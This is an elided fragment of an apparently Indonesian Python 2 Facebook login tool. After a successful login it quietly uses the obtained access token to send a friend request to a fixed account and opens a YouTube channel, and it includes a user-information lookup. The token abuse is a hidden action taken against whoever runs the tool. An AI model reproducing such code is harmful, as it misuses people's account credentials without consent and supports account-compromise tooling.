    ...
    try:
        ...
        if 'save-device' in url:
            try:
                ...
                zedd.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLOGIN SUCCES FULL :v'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://www.youtube.com/channel/UCQKIaMNAskVJJlAMs9LdSBQ')
                time.sleep(2)
                menu()
...
def informasi():
    ...
    for p in cok['data']:
        ...
        print '\x1b[1;91m[\xe2\x9c\x96] Pengguna tidak not found :v'
